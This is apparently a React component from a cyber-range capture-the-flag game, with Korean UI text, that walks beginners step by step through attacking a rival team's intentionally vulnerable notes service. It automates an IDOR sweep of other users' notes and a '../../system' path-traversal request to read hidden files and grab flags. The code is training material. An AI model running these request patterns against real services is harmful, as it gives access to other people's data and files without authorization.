import { useCallback, useEffect, useMemo, useState } from "react";
import { Button } from "@cyber-range/command-system";
import { sendTargetRequest, submitCapturedFlag, targetBaseUrl, type AttackTarget, type Session } from "./api";
import {
  extractToken, findFlag, guidedCredentials, missionForTarget, noteSweepIds,
  parseEntries, systemFilePath, type GuidedMission,
} from "./guided";

type StepStatus = "todo" | "active" | "done";
interface LogLine { label: string; detail: string; ok: boolean }

// One state bag per selected target so switching targets keeps progress.
interface RunState {
  index: number;             // current step pointer
  token: string;             // auto-captured bearer token
  flag: string;              // captured FLAG
  submitted: boolean;        // accepted by the game engine
  entries: string[];         // vault: discovered system files
  log: LogLine[];
  creds: { username: string; password: string };
  busy: boolean;
  error: string;
}

function freshRun(): RunState {
  return {
    index: 0, token: "", flag: "", submitted: false, entries: [], log: [],
    creds: guidedCredentials(), busy: false, error: "",
  };
}

export function GuidedMode({ target, session, onFlagAccepted }: {
  target: AttackTarget | null;
  session: Session;
  onFlagAccepted: () => Promise<void> | void;
}) {
  const mission = useMemo<GuidedMission>(() => missionForTarget(target?.service_slug), [target?.service_slug]);
  const runsKey = target ? `${target.team_id}:${target.service_id}` : "";
  const [runs, setRuns] = useState<Record<string, RunState>>({});

  const update = useCallback((patch: Partial<RunState> | ((prev: RunState) => Partial<RunState>)) => {
    setRuns((all) => {
      const prev = all[runsKey] ?? freshRun();
      const next = typeof patch === "function" ? patch(prev) : patch;
      return { ...all, [runsKey]: { ...prev, ...next } };
    });
  }, [runsKey]);

  // Seed a fresh mission the first time a target is selected.
  useEffect(() => {
    if (runsKey && !runs[runsKey]) setRuns((all) => ({ ...all, [runsKey]: freshRun() }));
  }, [runsKey, runs]);

  const run = runs[runsKey] ?? freshRun();

  const append = useCallback((label: string, detail: string, ok = true) =>
    update((prev) => ({ log: [...prev.log, { label, detail, ok }] })), [update]);

  const advance = useCallback(() =>
    update((prev) => ({ index: Math.min(prev.index + 1, mission.steps.length) })), [update, mission.steps.length]);

  async function performStep(stepId: string, current: RunState) {
    if (!target) return;
    const { username, password } = current.creds;
    const cred = JSON.stringify({ username, password });
    const call = (method: string, path: string, body: string, useToken: boolean) =>
      sendTargetRequest(target, method, path, useToken ? current.token : "", body);

    if (stepId === "register") {
      const res = await call("POST", "/api/register", cred, false);
      append("REGISTER", `HTTP ${res.status} · 계정 '${username}' 생성`, res.status < 400);
      advance();
    } else if (stepId === "login") {
      const res = await call("POST", "/api/login", cred, false);
      const token = extractToken(res.body);
      if (!token) throw new Error(`로그인 실패 (HTTP ${res.status}). 먼저 계정을 생성했는지 확인하세요.`);
      append("LOGIN", `HTTP ${res.status} · access token 자동 설정됨 (${token.slice(0, 12)}…)`, true);
      update({ token });
      advance();
    } else if (stepId === "explore") {
      for (const id of noteSweepIds()) {
        const res = await call("GET", `/api/notes/${id}`, "", true);
        const flag = findFlag(res.body);
        if (flag) {
          append("IDOR", `/api/notes/${id} → 다른 사용자의 노트에서 FLAG 발견!`, true);
          update({ flag });
          advance();
          return;
        }
      }
      append("IDOR", "노트를 훑었지만 FLAG를 찾지 못했습니다. 다시 시도하거나 다른 대상을 선택하세요.", false);
    } else if (stepId === "discover") {
      const res = await call("GET", "/api/files?path=../../system", "", true);
      const entries = parseEntries(res.body);
      const inlineFlag = findFlag(res.body);
      if (entries.length === 0) {
        append("DISCOVER", `HTTP ${res.status} · 디렉터리 목록을 받지 못했습니다.`, false);
        return;
      }
      append("DISCOVER",
        `path=../../system → 숨겨진 파일 ${entries.length}개 노출: ${entries.slice(0, 4).join(", ")}${entries.length > 4 ? " …" : ""}`,
        true);
      update({ entries, ...(inlineFlag ? { flag: inlineFlag } : {}) });
      advance();
    } else if (stepId === "read") {
      for (const name of current.entries) {
        const res = await call("GET", `/api/files?path=${systemFilePath(name)}`, "", true);
        const flag = findFlag(res.body);
        if (flag) {
          append("READ", `${name} → 파일 내용에서 FLAG 발견!`, true);
          update({ flag });
          advance();
          return;
        }
      }
      append("READ", "탐색된 파일에서 FLAG를 찾지 못했습니다.", false);
    } else if (stepId === "capture") {
      if (!current.flag) throw new Error("아직 FLAG를 획득하지 못했습니다.");
      append("CAPTURE", `FLAG 확보: ${current.flag}`, true);
      advance();
    } else if (stepId === "submit") {
      const result = await submitCapturedFlag(session.match_id, session.access_token, current.flag);
      if (result.accepted) {
        append("SUBMIT", `FLAG 제출 성공 · +${result.score_delta ?? 0} ATTACK 🎉`, true);
        update({ submitted: true });
        advance();
        await onFlagAccepted();
      } else {
        append("SUBMIT", `제출이 거절되었습니다 (inactive/중복/자기팀/무효): ${result.reason ?? result.status}`, false);
      }
    }
  }

  async function runStep() {
    const step = mission.steps[run.index];
    if (!step || run.busy) return;
    update({ busy: true, error: "" });
    try {
      await performStep(step.id, run);
    } catch (reason) {
      update({ error: String(reason) });
      append(step.id.toUpperCase(), String(reason), false);
    } finally {
      update({ busy: false });
    }
  }

  function reset() {
    setRuns((all) => ({ ...all, [runsKey]: freshRun() }));
  }

  if (!target) {
    return (
      <section className="rp-col rp-guided-empty">
        <div className="rp-eyebrow">BEGINNER · GUIDED MODE</div>
        <h1 style={{ fontSize: "1.5rem", margin: "8px 0" }}>공격할 상대 서비스를 선택하세요</h1>
        <p className="rp-muted" style={{ fontSize: 14 }}>왼쪽 목록에서 <strong>Team 02 · Vulnerable Notes</strong> 를 먼저 고르면 단계별 가이드가 시작됩니다.</p>
      </section>
    );
  }

  const currentStep = mission.steps[run.index];
  const complete = run.index >= mission.steps.length;

  return (
    <section className="rp-work rp-col">
      <div className="rp-work-head">
        <div>
          <span className="rp-eyebrow">{mission.code} · GUIDED</span>
          <h1 style={{ fontSize: "1.5rem", margin: "4px 0" }}>{target.team} · {target.service}</h1>
          <p className="rp-muted" style={{ fontSize: 14, maxWidth: "36rem" }}>{mission.objective}</p>
          <code className="rp-subtle" style={{ fontSize: 11 }}>{targetBaseUrl(target)}</code>
        </div>
        <Button onClick={reset}>↺ 미션 재시작</Button>
      </div>

      <ol className="rp-steps">
        {mission.steps.map((step, index) => {
          const status: StepStatus = index < run.index ? "done" : index === run.index ? "active" : "todo";
          const isCurrent = status === "active" && !complete;
          return (
            <li key={step.id} className={`rp-step rp-${status}`}>
              <div className="rp-step-row">
                <span className="rp-step-num">{status === "done" ? "✓" : index + 1}</span>
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
                    <strong style={{ fontSize: 14 }}>{step.title}</strong>
                    <span className="rp-step-tag">
                      {status === "done" ? "완료" : isCurrent ? "지금 할 일" : `Step ${index + 1}/${mission.steps.length}`}
                    </span>
                  </div>
                  {isCurrent && <p className="rp-step-why">{step.why}</p>}
                </div>
              </div>
              {isCurrent && (
                <div className="rp-step-action">
                  <Button tone="critical" disabled={run.busy} onClick={runStep}>
                    {run.busy ? "실행 중…" : step.action}
                  </Button>
                  {run.error && <span role="alert" className="rp-accent" style={{ fontSize: 11 }}>{run.error}</span>}
                </div>
              )}
            </li>
          );
        })}
      </ol>

      {complete && (
        <div className="rp-complete">
          <div className="rp-section-label" style={{ color: "var(--cr-green)" }}>MISSION COMPLETE</div>
          <h2 style={{ fontSize: "1.1rem", margin: "4px 0 0" }}>{mission.name} 성공 🎉</h2>
          <p className="rp-muted" style={{ fontSize: 12, marginTop: 4 }}>START HERE 화면으로 돌아가면 진행 상태가 다음 단계로 넘어갑니다.</p>
        </div>
      )}

      {run.flag && !run.submitted && currentStep?.id !== "submit" && (
        <div className="rp-flag-detected">
          <span className="rp-eyebrow">FLAG DETECTED</span>
          <code>{run.flag}</code>
        </div>
      )}

      <section className="rp-activity">
        <div className="rp-activity-head">ACTIVITY LOG · 실제 요청 기록</div>
        {run.log.length === 0
          ? <div className="rp-placeholder">각 단계 버튼을 누르면 실제 대상 서비스로 보낸 요청과 결과가 여기에 기록됩니다.</div>
          : <ul className="rp-log">
              {run.log.map((line, i) => (
                <li key={i} className="rp-log-row">
                  <span className={`rp-log-label ${line.ok ? "rp-ok" : "rp-bad"}`}>{line.label}</span>
                  <span className="rp-log-detail">{line.detail}</span>
                </li>
              ))}
            </ul>}
      </section>
    </section>
  );
}
